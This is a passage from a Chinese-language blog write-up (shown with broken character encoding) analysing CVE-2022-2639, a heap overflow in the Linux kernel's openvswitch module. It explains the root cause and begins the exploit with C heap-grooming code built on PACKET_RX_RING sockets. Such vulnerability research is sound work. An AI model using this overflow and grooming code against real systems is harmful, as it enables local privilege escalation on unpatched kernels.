<p>åœ¨ <code>ovs_ct_copy_action</code> ä¸­ï¼Œ<code>parse_ct</code> ä¸­åªéœ€è¦ 8 å­—èŠ‚å°±èƒ½æ„é€ åˆæ³•çš„ <code>nlattr</code>ï¼ˆæˆ–è€…æ›´å°‘ï¼Ÿä¸ç¡®å®šï¼‰ã€‚è€Œåœ¨ä¸‹é¢çš„ <code>ovs_nla_add_action</code> ä¸­ï¼Œ<code>add_action</code> ä¼ å…¥çš„ç»“æ„ä½“ <code>data</code> å’Œ <code>len</code> åˆ†åˆ«æ˜¯ <code>ovs_conntrack_info</code> å’Œè¯¥ç»“æ„ä½“çš„é•¿åº¦ï¼š</p>
<p><img src="/img/CVE-2022-2639/13.png"></p>
<p><img src="/img/CVE-2022-2639/14.png"></p>
<p>è€Œåœ¨ kernel 5.13 ä¸­è¯¥ç»“æ„ä½“å¤§å°ä¸º 0xa0ï¼š</p>
<p><img src="/img/CVE-2022-2639/15.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬æ·»åŠ 500ä¸ª <code>OVS_ACTION_ATTR_CT</code> çš„ <code>nlattr</code>ï¼Œé‚£åªç”¨äº† 500*8 &#x3D; 0xFA0 å­—èŠ‚çš„ <code>nlattr</code> é•¿åº¦ï¼Œå´è®©æˆ‘ä»¬æœ€å‰é¢æåˆ°çš„ buffer çš„ <code>next_offset</code> æˆåŠŸå¢åŠ äº† 0x500*0xa0 &#x3D; 0x13880 ä¸ªå­—èŠ‚ã€‚å¯ä»¥è§¦å‘æº¢å‡ºã€‚ä½†æ˜¯ä½¿ç”¨ <code>ovs_conntrack_info</code> æœ‰ä¸ªå±€é™æ€§ï¼Œå°±æ˜¯è¿™ä¸ªç»“æ„ä½“åœ¨å†…æ ¸ç‰ˆæœ¬çš„æ›´è¿­ä¸­è¢«ä¿®æ”¹è¿‡å¤šæ¬¡ï¼Œå¯¼è‡´åœ¨ä¸åŒç‰ˆæœ¬çš„å†…æ ¸å…¶å¤§å°å¹¶ä¸å›ºå®šã€‚<strong>è™½ç„¶ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œä½†è‡³å°‘æä¾›äº†ä¸€ä¸ªæ€è·¯ï¼šé€šè¿‡ <code>add_action</code> å°† <code>next_offset</code> æŒ‡é’ˆå‘åç§»åŠ¨ï¼Œä½¿å…¶çªç ´ 0xffff çš„é™åˆ¶ã€‚</strong></p>
<p>æ‰€ä»¥ä¸ºäº†é¿å…ä¸é€šç”¨çš„æƒ…å†µï¼Œå†å¯»æ‰¾æœ‰æ²¡æœ‰å…¶ä»–å¯ç”¨çš„ <code>ACTION_ATTR</code>ï¼ˆæ¯•ç«Ÿé‚£ä¹ˆå¤šå‘¢ï¼‰ã€‚å¯ä»¥æ‰¾åˆ°<code>OVS_ACTION_ATTR_SET</code>ï¼š</p>
<p><img src="/img/CVE-2022-2639/16.png"></p>
<p>åœ¨ case ä¸­å¹¶æœªå¯¹å…³é”®çš„ <code>skip_copy</code> è¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯å°†å…¶ä¼ å…¥äº†è°ƒç”¨çš„å‡½æ•°ä¸­ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">validate_set</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *a,</span></span><br><span class="line"><span class="params">			<span class="type">const</span> <span class="keyword">struct</span> sw_flow_key *flow_key,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> sw_flow_actions **sfa, <span class="type">bool</span> *skip_copy,</span></span><br><span class="line"><span class="params">			u8 mac_proto, __be16 eth_type, <span class="type">bool</span> masked, <span class="type">bool</span> <span class="built_in">log</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">ovs_key</span> =</span> nla_data(a);</span><br><span class="line">	<span class="type">int</span> key_type = nla_type(ovs_key);</span><br><span class="line">	<span class="type">size_t</span> key_len;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* There can be only one key in a action */</span></span><br><span class="line">	<span class="keyword">if</span> (nla_total_size(nla_len(ovs_key)) != nla_len(a))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	key_len = nla_len(ovs_key);</span><br><span class="line">	<span class="comment">// ä¼ å…¥ masked ä¸º false</span></span><br><span class="line">	<span class="keyword">if</span> (masked)</span><br><span class="line">		key_len /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (key_type &gt; OVS_KEY_ATTR_MAX ||</span><br><span class="line">		<span class="comment">// æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå¯¹ key_len çš„æ£€æŸ¥</span></span><br><span class="line">	    !check_attr_len(key_len, ovs_key_lens[key_type].len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (masked &amp;&amp; !validate_masked(nla_data(ovs_key), key_len))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (key_type) &#123;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="comment">// å¯¹è¯¥ type çš„æ£€æŸ¥éå¸¸ç®€å•</span></span><br><span class="line">	<span class="keyword">case</span> OVS_KEY_ATTR_ETHERNET:</span><br><span class="line">		<span class="keyword">if</span> (mac_proto != MAC_PROTO_ETHERNET)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Convert non-masked non-tunnel set actions to masked set actions. */</span></span><br><span class="line">	<span class="keyword">if</span> (!masked &amp;&amp; key_type != OVS_KEY_ATTR_TUNNEL) &#123;</span><br><span class="line">            <span class="comment">// ï¼ï¼ï¼ æ³¨æ„æ­¤æ—¶çš„ len = key_len * 2</span></span><br><span class="line">            <span class="type">int</span> start, len = key_len * <span class="number">2</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">at</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// ï¼ï¼ï¼</span></span><br><span class="line">            *skip_copy = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            start = add_nested_action_start(sfa,</span><br><span class="line">                                            OVS_ACTION_ATTR_SET_TO_MASKED,</span><br><span class="line">                                            <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (start &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> start;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è°ƒç”¨__add_actionï¼Œä¼ å…¥çš„lenä¸ºkey_lenä¸¤å€</span></span><br><span class="line">            at = __add_action(sfa, key_type, <span class="literal">NULL</span>, len, <span class="built_in">log</span>);</span><br><span class="line">            <span class="keyword">if</span> (IS_ERR(at))</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(at);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(nla_data(at), nla_data(ovs_key), key_len); <span class="comment">/* Key. */</span></span><br><span class="line">            <span class="built_in">memset</span>(nla_data(at) + key_len, <span class="number">0xff</span>, key_len);    <span class="comment">/* Mask. */</span></span><br><span class="line">            <span class="comment">/* Clear non-writeable bits from otherwise writeable fields. */</span></span><br><span class="line">            <span class="keyword">if</span> (key_type == OVS_KEY_ATTR_IPV6) &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">ovs_key_ipv6</span> *<span class="title">mask</span> =</span> nla_data(at) + key_len;</span><br><span class="line"></span><br><span class="line">                mask-&gt;ipv6_label &amp;= htonl(<span class="number">0x000FFFFF</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            add_nested_action_end(*sfa, start);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æˆ‘ä»¬å†…éƒ¨åµŒå¥—çš„ <code>nlattr type</code>ä¸º <code>OVS_KEY_ATTR_ETHERNET</code>ï¼Œé¦–å…ˆè¦é€šè¿‡å‰é¢æåˆ°çš„ <code>key_len</code> çš„æ£€æŸ¥ï¼Œå³ <code>key_len</code> ç­‰äº sizeof(struct ovs_key_ethernet) &#x3D; 1*2*6 &#x3D; 0x0Cï¼š</p>
<p><img src="/img/CVE-2022-2639/17.png"></p>
<p><img src="/img/CVE-2022-2639/18.png"></p>
<p><img src="/img/CVE-2022-2639/19.png"></p>
<p>ç®—ä¸Šæ·»åŠ è¿™ä¸ª <code>nlattr</code> æ‰€éœ€çš„ä¸¤å±‚ headerï¼ˆåµŒå¥—ï¼‰ï¼Œå³éœ€è¦ä½¿ç”¨ 0x04 + 0x04 + 0x0C &#x3D; 0x14 å­—èŠ‚çš„å†…å­˜å°±è®©æœ€å‰é¢æå‡ºçš„ <code>next_offset</code> çš„æŒ‡é’ˆå‰è¿› 0x04 + 0x04 + 0x0C * 2 &#x3D; 0x20 å­—èŠ‚ã€‚è™½ç„¶æ”¾å¤§æ¯”ä¾‹ä¸å¦‚ <code>sizeof(struct ovs_conntrack_info)</code>ï¼Œä½†å¥½åœ¨å…¶åœ¨èƒ½ç”¨æ¥æº¢å‡ºçš„å‰æä¸‹ï¼Œä¿è¯äº†æ›´ä¼˜çš„ç¨³å®šæ€§ï¼ˆæ— éœ€æ ¹æ®å†…æ ¸ç‰ˆæœ¬æ¥è®¡ç®—ç»“æ„ä½“çš„å¤§å°ä¸”ç²’åº¦è¾ƒå°ï¼Œæº¢å‡ºå†™ä¼šæ›´ç²¾ç¡®ï¼‰ã€‚<br>æœ€ååœ¨å›åˆ° <code>copy_action</code> ä¸­ï¼Œ<code>memcpy</code> çš„æ—¶å€™å°±ä¼šäº§ç”Ÿæº¢å‡ºã€‚ä¹Ÿå°±æ˜¯ç¬¬äºŒæ¬¡æ‹·è´å‰©ä½™çš„ <code>nlattr</code> æ—¶ï¼ˆç¬¬ä¸€æ¬¡æ˜¯å¯¹å‰é¢ <code>OVS_ACTION_ATTR_SET</code> æ¨åŠ¨ <code>next_offset</code> çš„æ“ä½œï¼‰ã€‚</p>
<h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>é‚£ä¹ˆç°åœ¨æ¼æ´å¾ˆæ˜æ˜¾ï¼šåœ¨ 0x10000 çš„ slab ä¸Šçš„å †æº¢å‡ºã€‚</p>
<p>ï¼ˆç”±äºæœ¬äººç»å¸¸å–œæ¬¢åœ¨çº¸ä¸Šå†™å†™ç”»ç”»ï¼Œæ‰€ä»¥ä¸‹é¢å¯èƒ½ä¼šå‡ºç°ä¸€äº›å¥‡æ€ªçš„ç¤ºæ„å›¾ç‰‡~~å…¶ä»–éå¸¸ç²¾ç¾çš„å›¾ç‰‡éƒ½æ¥è‡ª <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-2639 openvswitch LPE æ¼æ´åˆ†æ</a>ï¼‰</p>
<p>ä»¥å¾€ç»å¸¸ä½¿ç”¨çš„æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>struct msg_msg</code> æ¯ä¸ªä¸»æ¶ˆæ¯æœ€å¤šä¸€ä¸ªé¡µå¤§å°ï¼Œå³ 0x1000ï¼Œåç»­çš„ <code>msg_msgseg</code> è™½ç„¶ä¼šå•é“¾è¡¨è¿æ¥ï¼Œä½†æ˜¯æƒ³ç›´æ¥è®©å‘ç”Ÿæº¢å‡ºçš„ 0x10000 çš„ slab åç´§æŒ¨ç€è¿™ä¸¤ç§ç»“æ„çš„æ¦‚ç‡æä½ã€‚æ‰€ä»¥æ—¢ç„¶éœ€è¦è·¨é¡µï¼Œä¸å¦‚ä½¿ç”¨é¡µé£æ°´æ¥è°ƒèŠ‚å†…å­˜å¸ƒå±€ï¼ˆæ›´å¤šå…³äºé¡µé£æ°´çš„åŸç†å’Œåˆ©ç”¨åç»­æ•´ç†å¥½ corCTF2022-cache-of-castaways å’Œ CVE-2022-27666 é“¾è¿‡å»~ï¼‰ã€‚è¯´åˆ°é¡µé£æ°´ï¼Œé‚£å°±è¦è¯·å‡º <code>setsockopt PACKET_TX_RING/PACKET_RX_RING</code> äº†ã€‚é€šè¿‡è¯¥å‡½æ•°ï¼Œå°±å¯ä»¥éšæ—¶ç”³è¯· 0x10000 çš„ slab å¹¶ä¸”éšæ—¶é‡Šæ”¾è¿™äº› slabã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">packet_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">sockptr_t</span> optval,</span></span><br><span class="line"><span class="params">		  <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (level != SOL_PACKET)</span><br><span class="line">		<span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="keyword">case</span> PACKET_RX_RING:</span><br><span class="line">	<span class="keyword">case</span> PACKET_TX_RING:</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="class"><span class="keyword">union</span> <span class="title">tpacket_req_u</span> <span class="title">req_u</span>;</span></span><br><span class="line">		<span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">		lock_sock(sk);</span><br><span class="line">		<span class="keyword">switch</span> (po-&gt;tp_version) &#123;</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">		<span class="keyword">case</span> TPACKET_V3:</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			len = <span class="keyword">sizeof</span>(req_u.req3);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (optlen &lt; len) &#123;</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))</span><br><span class="line">				ret = -EFAULT;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				ret = packet_set_ring(sk, &amp;req_u, <span class="number">0</span>,</span><br><span class="line">						    optname == PACKET_TX_RING);</span><br><span class="line">		&#125;</span><br><span class="line">		release_sock(sk);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_set_ring</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="keyword">union</span> tpacket_req_u *req_u,</span></span><br><span class="line"><span class="params">		<span class="type">int</span> closing, <span class="type">int</span> tx_ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">packet_sock</span> *<span class="title">po</span> =</span> pkt_sk(sk);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">	<span class="keyword">if</span> (req-&gt;tp_block_nr) &#123;</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">		order = get_order(req-&gt;tp_block_size);</span><br><span class="line">		pg_vec = alloc_pg_vec(req, order);</span><br><span class="line">		Â·Â·Â·</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	Â·Â·Â·</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line">	Â·Â·Â·</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* __get_free_pages failed, fall back to vmalloc */</span></span><br><span class="line">	buffer = vzalloc(array_size((<span class="number">1</span> &lt;&lt; order), PAGE_SIZE));</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* vmalloc failed, lets dig into swap here */</span></span><br><span class="line">	gfp_flags &amp;= ~__GFP_NORETRY;</span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* complete and utter failure */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç»å¸¸ä½¿ç”¨çš„æ¿å­ï¼ˆä¹‹å‰è‡ªå·±å†™çš„ä¸æ˜¯å¾ˆçµæ´»ï¼Œç›´æ¥ç”¨ <a href="https://veritas501.github.io/2022_10_18-CVE-2022-2639%20%20openvswitch%20LPE%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">veritas501 å¸ˆå‚…åšå®¢</a> ä¸­çš„äº†ï¼Œæ­¤å¤–è¿˜æ”¶è·äº†å…¶ä»–ä¸€äº›æ¯”è¾ƒæœ‰ç”¨çš„è½®å­ğŸ˜ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/ethernet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set parameter &amp; call setsockopt() to alloc RX_RING buffer</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">packet_socket_rx_ring_init</span><span class="params">(<span class="type">int</span> s, <span class="type">unsigned</span> <span class="type">int</span> block_size,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> frame_size, <span class="type">unsigned</span> <span class="type">int</span> block_nr,</span></span><br><span class="line"><span class="params">                                <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">unsigned</span> <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> v = TPACKET_V3;</span><br><span class="line">    <span class="type">int</span> rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &amp;v, <span class="keyword">sizeof</span>(v));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">&quot;setsockopt(PACKET_VERSION)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req3</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = block_size;</span><br><span class="line">    req.tp_frame_size = frame_size;</span><br><span class="line">    req.tp_block_nr = block_nr;</span><br><span class="line">    req.tp_frame_nr = (block_size * block_nr) / frame_size;</span><br><span class="line">    req.tp_retire_blk_tov = timeout;</span><br><span class="line">    req.tp_sizeof_priv = sizeof_priv;</span><br><span class="line">    req.tp_feature_req_word = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;setsockopt(PACKET_RX_RING)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">packet_socket_setup</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> block_size, <span class="type">unsigned</span> <span class="type">int</span> frame_size,</span></span><br><span class="line"><span class="params">                        <span class="type">unsigned</span> <span class="type">int</span> block_nr, <span class="type">unsigned</span> <span class="type">int</span> sizeof_priv, <span class="type">int</span> timeout)</span> &#123;</span><br><span class="line">    <span class="type">int</span> s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));</span><br><span class="line">    <span class="keyword">if</span> (s &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;socket(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    packet_socket_rx_ring_init(s, block_size, frame_size, block_nr, sizeof_priv, timeout);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_ll</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    sa.sll_family = PF_PACKET;</span><br><span class="line">    sa.sll_protocol = htons(ETH_P_ALL);</span><br><span class="line">    sa.sll_ifindex = if_nametoindex(<span class="string">&quot;lo&quot;</span>);</span><br><span class="line">    sa.sll_hatype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_pkttype = <span class="number">0</span>;</span><br><span class="line">    sa.sll_halen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rv = bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    <span class="keyword">if</span> (rv &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;bind(AF_PACKET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pagealloc_pad</span><span class="params">(<span class="type">int</span> count, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// packet_socket_setup(size, 4096, count, 0, 100); æ•ˆæœç›¸åŒ</span></span><br><span class="line">    <span class="keyword">return</span> packet_socket_setup(size, <span class="number">2048</span>, count, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">fd = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>) <span class="comment">// åˆ†é…ä¸€ä¸ª0x10000çš„chunk</span></span><br><span class="line">close(fd) <span class="comment">// é‡Šæ”¾ chunk</span></span><br><span class="line">    </span><br><span class="line">fd = pagealloc_pad(<span class="number">100</span>, <span class="number">0x1000</span>) <span class="comment">// åˆ†é… 100 ä¸ª 0x1000 çš„chunk</span></span><br><span class="line">close(fd) <span class="comment">// ä¸€æ¬¡æ€§é‡Šæ”¾è¿™ä¸ª100ä¸ªchunk</span></span><br></pre></td></tr></table></figure>



<h2 id="exploit-1ï¼šæ³„éœ²-0x400-slab-å †åœ°å€"><a href="#exploit-1ï¼šæ³„éœ²-0x400-slab-å †åœ°å€" class="headerlink" title="exploit-1ï¼šæ³„éœ² 0x400 slab å †åœ°å€"></a>exploit-1ï¼šæ³„éœ² 0x400 slab å †åœ°å€</h2><p>é¦–å…ˆåˆ©ç”¨ä¸Šè¿°æŠ€æœ¯æŠŠå†…æ ¸çš„å †å—æ•´ç†ï¼Œå°½å¯èƒ½çš„æ¶ˆè€—å®Œ freelist ä¸­çš„ç©ºé—² slabã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pagealloc_pad(<span class="number">1000</span>, <span class="number">0x1000</span>);    <span class="comment">// 1000*0x1000</span></span><br><span class="line">pagealloc_pad(<span class="number">500</span>, <span class="number">0x2000</span>);     <span class="comment">// 500*0x2000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x4000</span>);     <span class="comment">// 200*0x4000</span></span><br><span class="line">pagealloc_pad(<span class="number">200</span>, <span class="number">0x8000</span>);     <span class="comment">// 200*0x8000</span></span><br><span class="line">pagealloc_pad(<span class="number">100</span>, <span class="number">0x10000</span>);    <span class="comment">// 100*0x10000</span></span><br></pre></td></tr></table></figure>

<p>æ¥ç€å†æ¬¡ç”³è¯· 0x10000 çš„ slabï¼Œç”±äºæ­¤æ—¶çš„å †å—å‡è¢«æ¸…ç†èµ°ä¸”ä¸å­˜åœ¨ 0x10000 çš„ç©ºé—² slabï¼Œé‚£ä¹ˆå†æ¬¡ç”³è¯· 0x10000 çš„ slab æ—¶ï¼Œå°±ä¼šä» order-5 çš„ 0x20000 çš„ slab ä¸­ç”³è¯·å†…å­˜ç„¶ååˆ†å‰²æˆä¸¤ä¸ª order-4 å³ 0x10000 çš„ slabã€‚<strong>å› æ­¤æ­¤æ—¶åˆ†é…çš„ 0x10000 çš„ slab åœ°å€æå¤§æ¦‚ç‡æ˜¯ç›¸é‚»çš„ã€‚</strong></p>
<p>æ¥ç€å°±æ˜¯å¸¸ç”¨çš„å¥—è·¯ï¼Œéš”ä¸€ä¸ªé‡Šæ”¾ä¸€ä¸ªï¼Œç”±äºåªæœ‰ä¸¤ä¸ªç›¸é‚»çš„ order-n slab éƒ½è¢«é‡Šæ”¾äº†æ‰ä¼šåˆå¹¶æˆ order-(n+1)ï¼Œæ‰€ä»¥æ­¤æ—¶å¹¶ä¸ä¼šåˆå¹¶ï¼Œåˆšé‡Šæ”¾çš„ 0x10000 çš„ slab åˆ™å‡åœç•™åœ¨ freelist ä¸­ã€‚</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> target_fd_cnt (0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd[target_fd_cnt];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; target_fd_cnt; i++)</span><br><span class="line">    target_fd[i] = pagealloc_pad(<span class="number">1</span>, <span class="number">0x10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; target_fd_cnt; i+=<span class="number">2</span>) &#123;</span><br><span class="line">    close(target_fd[i]);</span><br><span class="line">    target_fd[i] = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶å¤§æ¦‚ç‡ä¼šå½¢æˆå¦‚ä¸‹çš„å †å¸ƒå±€ï¼š</p>
<p><img src="/img/CVE-2022-2639/2-1.png"></p>
